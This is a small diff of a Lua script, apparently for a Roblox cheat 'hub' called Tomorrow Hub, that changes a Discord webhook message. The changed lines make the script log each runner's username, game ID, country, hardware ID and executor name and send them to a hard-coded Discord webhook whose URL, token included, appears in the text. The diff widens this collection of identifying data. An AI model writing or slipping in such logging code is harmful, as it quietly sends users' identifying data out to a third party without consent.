@@ -10,8 +10,8 @@ local url = "https://discord.com/api/webhooks/967597785534840892/AzzhDhGUeQPwk_V
 local data = {
    ["embeds"] = {
        {
-           ["title"] = "Logged Details From Player",
-           ["description"] = "Username: "..plr.Name.." - country: "..country.." - Hwid:"..hwid.."",
+           ["title"] = "Tomorrow Hub: Logged Details",
+           ["description"] = "UserName: "..plr.Username.." - Game: "..game.PlaceId.." - Country: "..country.." - HWid: "..hwid.." - Executor: "..webhookcheck.."",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
